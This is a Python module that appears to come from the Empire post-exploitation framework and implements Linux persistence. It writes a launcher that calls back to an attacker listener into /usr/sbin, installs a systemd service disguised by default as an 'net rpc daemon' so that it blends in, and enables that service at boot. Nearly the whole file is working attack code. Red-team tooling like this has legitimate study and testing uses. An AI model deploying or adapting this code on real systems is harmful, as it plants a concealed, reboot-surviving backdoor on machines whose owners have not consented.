from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Linux Persistent Service - systemd',

            # list of one or more authors for the module
            'Author': ['@michaellongii'],

            # more verbose multi-line description of the module
            'Description': 'Installs an Empire launcher as a persistent systemd service that is executed at startup.',

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            # no need to base64 return data
            'OutputExtension': None,

            # if the module needs administrative privileges
            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ['https://attack.mitre.org/techniques/T1050/']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Remove' : {
                'Description'   :   'Remove persistent service.',
                'Required'      :   True,
                'Value'         :   'false'
            },
            'ServiceFile' : {
                'Description'   :   'Filename for the systemd service configuration file located in /etc/systemd/system/.',
                'Required'      :   True,
                'Value'         :   'netrpcd.service'
            },
            'ServiceDescription' : {
                'Description'   :   'Description of service; change this as needed to blend in with the environment.',
                'Required'      :   True,
                'Value'         :   'net rpc daemon'
            },
            'PayloadFile' : {
                'Description'   :   'Absolute path to file containing launcher payload.',
                'Required'      :   True,
                'Value'         :   '/usr/sbin/net.rpcd'
            },
            'RestartDelay' : {
                'Description'   :   'Seconds before restarting service on failure.',
                'Required'      :   True,
                'Value'         :   '5'
            }

        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        listenerName = self.options['Listener']['Value']        
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python')
        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
        remove = self.options['Remove']['Value']
        serviceFile = self.options['ServiceFile']['Value']
        serviceDescription = self.options['ServiceDescription']['Value']
        payloadFile = self.options['PayloadFile']['Value']
        serviceDelay = self.options['RestartDelay']['Value']
        serviceConfig = """[Unit]
Description=%s
After=network.target \\n
[Service]
Restart=always
RestartSec=%s
ExecStart=/bin/sh %s \\n
[Install]
WantedBy=multi-user.target
""" % (serviceDescription, serviceDelay, payloadFile)
        script = """
import os
import sys
remove = "%s"
serviceName = "%s"
serviceFile = "/etc/systemd/system/" + serviceName
payloadFile = "%s"
serviceConfig = \"\"\"
%s
\"\"\"
launcher = "%s"

# Cleanup sequence; stop persistent service and remove associated files 
if remove == "true":
    # Prevent persistent service from executing at system startup
    try:
        procH = subprocess.Popen(['systemctl', 'disable', serviceName], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = procH.communicate()
        print "[+] Disabling persistent service."
    except Exception as e:
        print "[-] ", e

    # Delete service configuration file located in /etc/systemd/system/
    try:
        os.remove(serviceFile)
        print "[+] Deleted ", serviceFile
    except Exception as e:
        print "[-] ", e

    # Delete payload/launcher file located in /usr/sbin/
    try:
        os.remove(payloadFile)
        print "[+] Deleted ", payloadFile
    except Exception as e:
        print "[-] ", e
    
    # reload daemon configuration to flush lingering persistent service messages
    try:
        procH = subprocess.Popen(['systemctl', 'daemon-reload'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = procH.communicate()
        print "[+] Reloading daemon configuration"
    except Exception as e:
        print "[-] ", e

else:
    # create launcher file
    try:
        fH = open(payloadFile,'w')
        data = 'python -c "' + launcher + '"'
        fH.write(data)
        fH.close()
        print "[+] Created launcher file: ", payloadFile
    except Exception as e:
        print "[-] ", e

    # create service configuration file
    try:
        fH = open(serviceFile,'w')
        fH.write(serviceConfig)
        fH.close()
        print "[+] Created service configuration file: ", serviceFile
    except Exception as e:
        print "\\n[-] ", e

    # reload daemon configuration
    try:
        procH = subprocess.Popen(['systemctl', 'daemon-reload'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        procH.communicate()
        print "[+] Reloading daemon configuration."
    except Exception as e:
        print "[-] ", e

    # start service
    try:
        procH = subprocess.Popen(['systemctl', 'start', serviceName], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = procH.communicate()
        print "[+] Starting service."
    except Exception as e:
        print "[-] ", e

    # configure service to execute at system startup
    try:
        procH = subprocess.Popen(['systemctl', 'enable', serviceName], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = procH.communicate()
        print "[+] Setting service to start at system boot."
    except Exception as e:
        print "[-] ", e

""" % (remove, serviceFile, payloadFile, serviceConfig, launcher)
        return script
